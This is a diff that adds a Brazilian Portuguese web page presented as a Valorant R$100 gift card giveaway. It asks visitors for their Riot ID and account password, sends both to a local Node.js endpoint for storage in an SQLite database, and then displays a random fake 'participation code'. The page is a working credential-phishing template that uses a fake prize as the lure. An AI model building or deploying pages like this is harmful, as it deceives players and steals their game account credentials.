@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteio Valorant - Resgate seu Gift Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@500;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --val-red: #ff4655;
+            --val-dark: #0f1923;
+            --val-gray: #ece8e1;
+            --val-cyan: #00ffcc;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--val-dark);
+            color: var(--val-gray);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 70, 85, 0.1) 0%, rgba(15, 25, 35, 1) 70%);
+            z-index: -1;
+        }
+
+        .container {
+            background: rgba(15, 25, 35, 0.85);
+            border: 2px solid rgba(255, 70, 85, 0.3);
+            border-radius: 4px;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 10px;
+            height: 10px;
+            background-color: var(--val-red);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-family: 'Teko', sans-serif;
+            font-size: 3rem;
+            color: var(--val-red);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            line-height: 1;
+        }
+
+        p.subtitle {
+            font-size: 0.9rem;
+            color: #8b9bb4;
+            margin-top: 5px;
+        }
+
+        .promo-banner {
+            background: linear-gradient(135deg, #1f2b38 0%, #111a24 100%);
+            border-left: 4px solid var(--val-red);
+            padding: 12px;
+            margin-bottom: 25px;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .promo-banner span {
+            color: var(--val-cyan);
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-family: 'Teko', sans-serif;
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+            color: var(--val-gray);
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            color: #fff;
+            font-family: 'Poppins', sans-serif;
+            font-size: 0.95rem;
+            border-radius: 2px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: var(--val-red);
+            box-shadow: 0 0 8px rgba(255, 70, 85, 0.4);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--val-red);
+            color: white;
+            border: none;
+            font-family: 'Teko', sans-serif;
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.1s;
+            margin-top: 10px;
+            clip-path: polygon(0 0, 100% 0, 95% 100%, 0% 100%);
+        }
+
+        .btn-submit:hover {
+            background-color: #ff5864;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.75rem;
+            color: #64748b;
+        }
+
+        #success-message {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        #success-message h2 {
+            font-family: 'Teko', sans-serif;
+            color: var(--val-cyan);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        #success-message p {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+            margin-bottom: 20px;
+        }
+
+        .gift-code-box {
+            background: #000;
+            border: 1px dashed var(--val-cyan);
+            padding: 15px;
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: var(--val-cyan);
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Formulário -->
+        <div id="form-container">
+            <header>
+                <h1>VALORANT</h1>
+                <p class="subtitle">Sorteio de Gift Card R$ 100</p>
+            </header>
+
+            <div class="promo-banner">
+                <div>Prêmio: <span>R$ 100,00 em VP</span></div>
+                <div>Status: 🟢 Ativo</div>
+            </div>
+
+            <form id="valForm" onsubmit="handleRegister(event)">
+                <div class="input-group">
+                    <label for="riotId">Riot ID / Usuário</label>
+                    <input type="text" id="riotId" placeholder="Ex: Player#BR1" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="senha">Senha</label>
+                    <input type="password" id="senha" placeholder="••••••••" required>
+                </div>
+
+                <button type="submit" class="btn-submit">Participar do Sorteio</button>
+            </form>
+
+            <div class="footer-text">
+                Sistema integrado com banco de dados SQLite.
+            </div>
+        </div>
+
+        <!-- Tela de Sucesso -->
+        <div id="success-message">
+            <h2>CADASTRO REALIZADO!</h2>
+            <p>Seus dados foram gravados no banco de dados com sucesso. Seu código de participação:</p>
+            <div class="gift-code-box" id="generatedCode">VALORANT-XXXX-YYYY</div>
+            <button class="btn-submit" onclick="resetForm()">Voltar</button>
+        </div>
+    </div>
+
+    <script>
+        async function handleRegister(event) {
+            event.preventDefault();
+
+            const riotId = document.getElementById('riotId').value;
+            const senha = document.getElementById('senha').value;
+
+            try {
+                // Envia os dados para o servidor Node.js
+                const response = await fetch('http://localhost:3000/api/cadastrar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ riotId, senha })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    const randomCode = 'VAL-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.floor(1000 + Math.random() * 9000);
+                    document.getElementById('generatedCode').innerText = randomCode;
+
+                    document.getElementById('form-container').style.display = 'none';
+                    document.getElementById('success-message').style.display = 'block';
+                } else {
+                    alert(data.erro || 'Ocorreu um erro ao cadastrar.');
+                }
+            } catch (err) {
+                console.error('Erro de conexão:', err);
+                alert('Erro ao ligar ao servidor. Verifique se executou "node server.js" no terminal.');
+            }
+        }
+
+        function resetForm() {
+            document.getElementById('valForm').reset();
+            document.getElementById('success-message').style.display = 'none';
+            document.getElementById('form-container').style.display = 'block';
+        }
+    </script>
+
+</body>
+</html>
